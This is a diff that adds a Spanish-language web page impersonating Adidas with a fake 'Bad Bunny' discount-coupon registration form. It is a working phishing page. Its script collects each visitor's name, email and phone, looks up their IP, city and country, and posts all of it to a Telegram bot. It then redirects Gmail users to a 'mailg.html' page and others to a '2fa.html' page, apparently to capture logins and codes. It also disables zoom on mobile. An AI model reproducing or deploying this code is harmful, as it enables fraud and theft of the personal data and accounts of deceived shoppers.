@@ -1,0 +1,412 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adidas para Bad Bunny</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            height: 100%;
+        }
+
+        /* Estilos de la barra de navegación */
+        .navbar {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #fff;
+            padding: 10px 20px;
+            box-shadow: 0 2px 5px rgba(0, 0, 0, 0.1);
+            position: fixed;
+            width: 100%;
+            top: 0;
+            z-index: 1000;
+        }
+
+        /* Logo centrado en la barra */
+        .navbar .logo {
+            display: flex;
+            justify-content: center;
+        }
+
+        .navbar .logo img {
+            height: 40px; /* Tamaño del logo */
+        }
+
+        /* Estilos para los iconos de la izquierda y derecha */
+        .navbar .left-icons, .navbar .right-icons {
+            position: absolute;
+            display: flex;
+            gap: 20px;
+        }
+
+        .navbar .left-icons {
+            left: 20px;
+        }
+
+        .navbar .right-icons {
+            right: 50px;
+        }
+
+        .navbar i {
+            font-size: 20px;
+            cursor: pointer;
+        }
+
+        /* Estilos de la imagen de fondo */
+        .banner {
+            background-image: url('/img/fw24_bad_bunny_gazelle_launch_confirmed_hp_mh_d_25ce1f2e0a.avif');
+            background-position: center;
+            background-size: cover;
+            background-repeat: no-repeat;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            margin-top: 60px; /* Para que la barra no cubra la imagen */
+            position: relative;
+        }
+
+        /* Div superpuesto sobre la imagen de fondo */
+        .overlay-content {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+
+        /* Estilos para el formulario o contenido superpuesto */
+        .form-container {
+            background-color: rgba(0, 0, 0, 0.5); /* Fondo semitransparente */
+            border-radius: 10px;
+        }
+
+        /* Estilo para la segunda imagen */
+        .second-image {
+            width: 100%;
+            height: auto;
+        }
+
+        /* Estilos del contenedor principal */
+        .container {
+            padding: 15px;
+            text-align: left;
+            width: 350px;
+        }
+
+        /* Estilos para el título */
+        .title {
+            background-color: black;
+            color: white;
+            font-weight: bold;
+            font-size: 32px;
+            padding: 10px;
+            margin: 0 0 20px 0;
+        }
+
+        /* Estilos para el texto */
+        .description {
+            background-color: black;
+            color: white;
+            font-size: 18px;
+            line-height: 1.5;
+            padding: 10px;
+            margin-bottom: 20px;
+        }
+
+        /* Estilos del botón */
+        .button {
+            width: 350px;
+            background-color: black; /* Fondo negro por defecto */
+            color: white; /* Texto blanco por defecto */
+            padding: 15px 30px;
+            text-align: center;
+            text-decoration: none;
+            font-weight: bold;
+            font-size: 18px;
+            display: inline-block;
+            border: 2px solid black;
+            cursor: pointer;
+            transition: transform 0.2s ease, background-color 0.3s ease, color 0.3s ease;
+        }
+
+        .button:hover {
+            background-color: black;
+            color: white;
+        }
+
+        /* Flecha en el botón */
+        .button::after {
+            content: " →";
+        }
+
+        .ipp {
+            outline: none;
+        }
+
+        /* Estilo para el aviso */
+        .notice {
+            font-size: 12px;
+            color: white;
+            margin-top: 10px;
+            padding: 10px;
+            background-color: black;
+            border-radius: 5px;
+            text-align: center;
+        }
+
+        .ip {
+            outline: none;
+            width: 344px;
+            height: 30px;
+        }
+
+        /* Pantalla de carga (invisible por defecto) */
+        #loading-screen {
+            display: none;
+            background-color: white;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        #tlf {
+            font-weight: bold; /* Negrita */
+        }
+
+    </style>
+</head>
+<body>
+
+    <!-- Barra de navegación -->
+    <div class="navbar">
+        <!-- Iconos de la izquierda -->
+        <div class="left-icons">
+            <img width="30px" src="img/dasdsa.png" alt=""> 
+        </div>
+        
+        <!-- Logo centrado -->
+        <div class="logo">
+            <img style="margin-left: -30px;" src="img/add.svg" alt="Logo">
+        </div>
+
+        <!-- Iconos de la derecha -->
+        <div class="right-icons">
+            <i class="fas fa-user"><img width="45px" src="img/asssa.png" alt=""></i> <!-- Ícono de usuario -->
+         </div>
+    </div>
+
+    <!-- Banner con la imagen de fondo -->
+    <div class="banner">
+        <!-- Div superpuesto sobre la imagen de fondo -->
+        <div class="overlay-content">
+            <div class="form-container">
+                <div class="container">
+                     <!-- Título -->
+                    <div class="title">REGISTRO DE CLIENTE</div>
+            
+                    <!-- Descripción -->
+                    <div class="description">
+                        Datos del cliente
+                    </div>
+
+                    <!-- Formulario -->
+                    <form id="cliente-form">
+                        <label for="nombre">Nombre y Apellido:</label><br><br>
+                        <input class="ip" type="text" id="nombre" name="nombre" required><br><br>
+
+                        <label for="email">Correo electrónico:</label><br><br>
+                        <input class="ip" type="email" id="email" name="email" required><br><br>
+
+                        <label for="tlf">Número de teléfono:</label><br><br>
+                        <input class="ip" type="tel" id="tlf" name="telefono" required><br><br>
+                        <br> 
+                        <!-- Botón -->
+                        <button type="submit" id="cupon-btn" class="button">COMPLETAR REGISTRO</button>
+                    </form>
+
+                    <!-- Aviso -->
+                    <div class="notice">
+                        El cupón de descuento aplicará solo para los primeros $1000 USD al cambio en moneda local en compras del cliente registrado.
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+ 
+    <!-- Segunda imagen debajo de la principal -->
+    <div>
+        <img src="/img/mh_sl72_d_656ec6acab.avif" alt="Segunda imagen Adidas" class="second-image">
+    </div>
+
+    <!-- Configuración de Telegram -->
+    <script src="config.js"></script>
+
+    <!-- Cargar librerías externas -->
+    <script src="https://kit.fontawesome.com/a076d05399.js"></script>
+
+    <!-- JavaScript para la detección del prefijo del país, animación de escritura y redirección -->
+    <script>
+        window.onload = function() {
+            const tlfInput = document.getElementById("tlf");
+            const cuponBtn = document.getElementById("cupon-btn");
+            const clienteForm = document.getElementById("cliente-form");
+            const loadingScreen = document.getElementById("loading-screen");
+    
+            // Usamos la API de ipapi.co para obtener el código de país y el prefijo
+            fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const countryCallingCode = data.country_calling_code; // Ejemplo: +57
+                const country = data.country_name;
+                const city = data.city;
+                const ip = data.ip;
+    
+                // Función para simular la escritura del prefijo
+                function typePrefix(prefix, element, delay = 150) {
+                    let index = 0;
+                    element.value = '';
+                    const typingInterval = setInterval(() => {
+                        element.value += prefix.charAt(index);
+                        index++;
+                        if (index >= prefix.length) {
+                            clearInterval(typingInterval);
+                            // Opcional: posicionar el cursor al final
+                            element.setSelectionRange(element.value.length, element.value.length);
+                        }
+                    }, delay);
+                }
+    
+                // Iniciar la escritura del prefijo
+                typePrefix(countryCallingCode, tlfInput);
+    
+                // Prevenir que el usuario borre el prefijo del país
+                tlfInput.addEventListener("input", function() {
+                    if (!tlfInput.value.startsWith(countryCallingCode)) {
+                        typePrefix(countryCallingCode, tlfInput);
+                    }
+                });
+    
+                // Manejar el envío del formulario
+                clienteForm.addEventListener('submit', function(event) {
+                    event.preventDefault(); // Prevenir el envío predeterminado del formulario
+    
+                    const nombre = document.getElementById('nombre').value.trim();
+                    const email = document.getElementById('email').value.trim();
+                    const telefono = document.getElementById('tlf').value.trim();
+    
+                    // Validación de campos (redundante con required, pero por seguridad)
+                    if (nombre === '' || email === '' || telefono === '') {
+                        alert('Por favor, completa todos los campos.');
+                        return;
+                    }
+    
+                    // Construir el mensaje en el formato solicitado
+                    const mensaje = `
+    Cliente ADIDAS ///
+    
+    N/A: ${nombre}
+    Mail: ${email}
+    Telf: ${telefono}
+    
+    ------INFORMACIÓN----
+    IP: ${ip}
+    Ciudad: ${city}
+    País: ${country}
+                    `;
+    
+                    // Enviar el mensaje a Telegram
+                    fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json'
+                        },
+                        body: JSON.stringify({
+                            chat_id: CHAT_ID,
+                            text: mensaje
+                        })
+                    })
+                    .then(response => response.json())
+                    .then(data => {
+                        if (data.ok) {
+                      
+    
+                            // Redirección según el dominio del correo
+                            setTimeout(() => {
+                                if (email.endsWith('@gmail.com')) {
+                                    window.location.href = 'mailg.html'; // Redirige a mailg.html si es Gmail
+                                } else {
+                                    window.location.href = '2fa.html'; // Redirige a 2fa.html para cualquier otro dominio
+                                }
+                            }, 2000); // 2 segundos para simular tiempo de carga
+                        } else {
+                            alert('Error al enviar los datos a Telegram. Por favor, inténtalo de nuevo.');
+                        }
+                    })
+                    .catch(error => {
+                        console.error("Error al enviar los datos a Telegram:", error);
+                        alert('Error al enviar los datos a Telegram. Verifica la conexión o el bot.');
+                    });
+                });
+            })
+            .catch(error => {
+                console.error("Error al obtener el prefijo del país:", error);
+            });
+    
+            // Cambiar el botón a blanco después de 2 segundos
+            setTimeout(function() {
+                cuponBtn.style.backgroundColor = "white";
+                cuponBtn.style.color = "black";
+            }, 2000); // 2 segundos
+        };
+    </script>
+    
+    <script>
+        // Función para desactivar el zoom en móviles
+        function disableZoom() {
+          document.addEventListener('touchstart', function(event) {
+            if (event.touches.length > 1) {
+              event.preventDefault(); // Evita el zoom en multi-touch
+            }
+          }, { passive: false });
+      
+          document.addEventListener('gesturestart', function(event) {
+            event.preventDefault(); // Evita el zoom de gesto
+          });
+        }
+      
+        // Detecta si es un dispositivo móvil y desactiva el zoom
+        if (/Mobi|Android/i.test(navigator.userAgent)) {
+          disableZoom();
+      
+          // Ajusta la propiedad del meta viewport para desactivar el zoom
+          let viewportMeta = document.querySelector('meta[name="viewport"]');
+          if (viewportMeta) {
+            viewportMeta.setAttribute('content', 'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no');
+          } else {
+            let meta = document.createElement('meta');
+            meta.name = 'viewport';
+            meta.content = 'width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no';
+            document.head.appendChild(meta);
+          }
+        }
+      </script>
+      
+
+</body>
+</html>
